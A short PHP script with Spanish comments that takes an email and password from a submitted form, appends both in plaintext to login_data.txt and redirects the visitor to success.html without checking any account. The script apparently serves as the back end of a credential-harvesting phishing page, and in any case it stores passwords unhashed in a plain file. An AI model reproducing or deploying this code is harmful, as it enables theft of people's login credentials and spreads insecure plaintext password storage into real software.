<?php
// Obtener los datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Preparar la línea de texto para escribir en el archivo
$line = "Email: $email, Password: $password\n";

// Escribir los datos en un archivo de texto
$file = fopen("login_data.txt", "a");
fwrite($file, $line);
fclose($file);

// Redirigir al usuario a la página de éxito
header("Location: success.html");
exit();
?>
